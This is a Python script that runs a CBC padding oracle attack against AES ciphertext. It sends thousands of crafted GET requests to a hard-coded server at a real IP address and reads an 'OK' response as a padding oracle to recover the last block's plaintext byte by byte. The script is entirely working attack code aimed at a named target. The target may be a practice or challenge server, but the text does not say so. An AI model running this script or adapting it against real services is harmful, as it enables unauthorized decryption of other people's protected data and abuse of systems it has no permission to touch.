import requests
import binascii
from urllib.parse import quote

def oracle_padding_attack(url, ciphertext_hex):
    # Convert ciphertext to bytes
    ciphertext = binascii.unhexlify(ciphertext_hex)
    block_size = 16  # AES uses 16-byte blocks
    
    # Split ciphertext into blocks
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    
    # We'll attack the last block first (typical padding attack approach)
    target_block_index = len(blocks) - 2  # Second to last block (we modify this to affect padding in last block)
    modified_blocks = blocks.copy()
    
    # Initialize intermediate values
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)
    
    print(f"Starting Oracle Padding Attack on {url}")
    print(f"Original ciphertext: {ciphertext_hex}")
    print(f"Split into {len(blocks)} blocks of {block_size} bytes each")
    
    # Iterate over each byte in the block from last to first
    for byte_pos in range(block_size-1, -1, -1):
        print(f"\nAttacking byte position {byte_pos}")
        
        # The padding value we're trying to achieve (1 for first byte, 2 for second, etc.)
        current_padding = block_size - byte_pos
        
        # Prepare the prefix blocks
        # We need to modify the previous block to manipulate the padding
        modified_prefix = bytearray(blocks[target_block_index])
        
        # Set bytes after current position to produce desired intermediate values
        for i in range(byte_pos + 1, block_size):
            modified_prefix[i] = intermediate[i] ^ current_padding
        
        # Try all possible values for current byte
        found = False
        for guess in range(256):
            modified_prefix[byte_pos] = guess
            modified_blocks[target_block_index] = bytes(modified_prefix)
            
            # Reconstruct the modified ciphertext
            modified_ciphertext = b''.join(modified_blocks)
            modified_ciphertext_hex = binascii.hexlify(modified_ciphertext).decode()
            
            # Make the request
            target_url = f"{url}?ciphertext={quote(modified_ciphertext_hex)}"
            response = requests.get(target_url)
            
            # Check for valid padding
            if "OK" in response.text:
                # Calculate intermediate value
                intermediate[byte_pos] = guess ^ current_padding
                # Calculate plaintext byte
                plaintext[byte_pos] = intermediate[byte_pos] ^ blocks[target_block_index][byte_pos]
                
                print(f"Found valid padding with byte value {guess:02x}")
                print(f"Intermediate value: {intermediate[byte_pos]:02x}")
                print(f"Plaintext byte: {chr(plaintext[byte_pos]) if plaintext[byte_pos] >= 32 else '\\x'+format(plaintext[byte_pos], '02x')}")
                found = True
                break
        
        if not found:
            print("Failed to find valid padding for this byte position")
            return None
    
    print("\nAttack completed successfully!")
    print(f"Recovered plaintext: {plaintext}")
    print(f"ASCII: {''.join(chr(b) if b >= 32 else f'\\x{b:02x}' for b in plaintext)}")
    
    return plaintext

# Target URL and ciphertext
url = "http://64.227.29.191/validador.cbc"
ciphertext_hex = "82a6f4f7a60f9798f167bf61232d7754824d8538ded42f7e4a53915327c07456"

# Perform the attack
recovered_plaintext = oracle_padding_attack(url, ciphertext_hex)